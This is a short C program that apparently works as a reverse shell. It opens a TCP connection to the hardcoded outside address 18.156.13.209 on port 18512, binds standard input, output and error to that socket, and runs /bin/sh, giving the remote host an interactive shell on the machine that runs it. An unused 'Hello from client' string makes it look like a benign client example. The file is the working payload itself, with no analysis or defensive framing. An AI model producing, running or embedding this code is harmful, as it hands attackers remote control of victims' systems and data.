#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
    struct sockaddr_in serv_addr;
    int sock = 0;
    char *hello = "Hello from client";
    serv_addr.sin_addr.s_addr = inet_addr("18.156.13.209");
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(18512);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        puts("connect error");
        return 1;
    }
    puts("Connected");
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/sh\0", NULL, NULL);
    return 0;
}